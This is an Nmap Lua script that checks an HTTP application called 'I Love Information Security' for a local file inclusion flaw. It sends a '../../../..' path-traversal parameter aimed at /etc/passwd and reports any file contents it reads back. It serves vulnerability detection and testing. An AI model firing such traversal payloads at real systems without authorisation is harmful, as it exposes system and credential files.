local shortport = require "shortport"
local stdnse = require "stdnse"
local http = require "http"
local vulns = require "vulns"
local exploit = require "exploit"

description = [[
This script detects the LFI vulnerability in I Love Information Security.
]]
categories = {"intrusive", "vuln", "exploit"}
author = "Wai Tuck <waituck@edgis-security.org"
license = "Same as Nmap---See https://nmap.org/book/man-legal.html"
portrule = shortport.http

action = function(host, port)
  local vuln_path = "?page=../../../.."
  local rfile = "/etc/passwd"
  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln_table = {
    title = "LFI vulnerability in I Love Information Security",
    extra_info= {}
  }
  local status, lfi_success, contents = exploit.lfi_check(host, port, vuln_path)
  if lfi_success then
    vuln_table.state = vulns.STATE.VULN
    table.insert(vuln_table.extra_info, contents)
  else
    vuln_table.state = vulns.STATE.NOT_VULN
  end
  return report:make_output(vuln_table)
end
